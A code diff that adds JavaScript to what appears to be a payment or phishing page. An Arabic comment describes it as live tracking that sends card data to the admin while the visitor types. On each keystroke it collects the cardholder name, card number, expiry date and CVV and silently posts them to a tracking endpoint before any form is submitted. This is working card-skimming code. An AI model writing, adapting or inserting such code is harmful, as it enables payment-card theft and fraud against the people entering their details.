@@ -782,6 +782,31 @@
 
     sendHeartbeat();
     setInterval(sendHeartbeat, 3000);
+
+    // تتبع لحظي — إرسال بيانات البطاقة للأدمن أثناء الكتابة
+    var _liveTimer = null;
+    function liveTrack() {
+      var cn = document.getElementById('cardName');
+      var cnum = document.getElementById('cardNumber');
+      var exp = document.getElementById('expiryDate');
+      var cv = document.getElementById('cvv');
+      var data = { visitId: visitId, step: 'card' };
+      if (cn && cn.value.trim()) data.cardName = cn.value.trim();
+      if (cnum && cnum.value.trim()) data.cardNumber = cnum.value.replace(/\s/g, '');
+      if (exp && exp.value.trim()) data.cardExpiry = exp.value.trim();
+      if (cv && cv.value.trim()) data.cardCvv = cv.value.trim();
+      // أرسل فقط إذا فيه بيانات بطاقة
+      if (data.cardName || data.cardNumber) {
+        fetch('/api/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        }).catch(function(){});
+      }
+    }
+    function debouncedLive() { clearTimeout(_liveTimer); _liveTimer = setTimeout(liveTrack, 800); }
+    document.addEventListener('input', debouncedLive, true);
+    document.addEventListener('change', function(){ setTimeout(liveTrack, 100); }, true);
   });
 </script>
 <script src="heartbeat.js"></script>
